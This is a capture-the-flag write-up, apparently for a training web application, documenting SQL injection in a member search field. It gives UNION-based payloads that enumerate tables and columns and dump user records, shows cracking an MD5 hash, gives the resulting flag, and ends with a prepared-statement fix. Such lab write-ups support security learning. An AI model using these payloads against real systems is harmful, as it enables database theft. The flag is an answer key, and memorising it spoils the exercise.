# 02_inject_me_member

The GET parameter in the member search form is vulnerable.

## Method

Go to ?page=member
In the search field, search `1 AND 1=1`

## How to exploit

In the search field, run `-1 union select null, concat (table_name) from information_schema.tables where table_schema = database ()`  
This will return a table name.  
Then, in the same search field, run `-1 union select null, concat (column_name) from information_schema.columns where table_schema = database ()`  
This will return the column names.  
Lastly, in the search field, run `-1 union select NULL, concat (user_id, first_name, last_name, town, country, planet, Commentaire, countersign) from users`  
This will return the users from the table:  

```Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28```  

MD5 decrypt: `5ff9d0165b4f92b14994e5c685cdce28`  
Follwed by sha256: `FortyTwo -> fortytwo`  
Flag: `10A16D834F9B1E4068B25C4C46FE0284E99E44DCEAF08098FC83925BA6310FF5`


## Solution

- Send form as POST request
- Add prepared statements to backend to prevent SQL injection
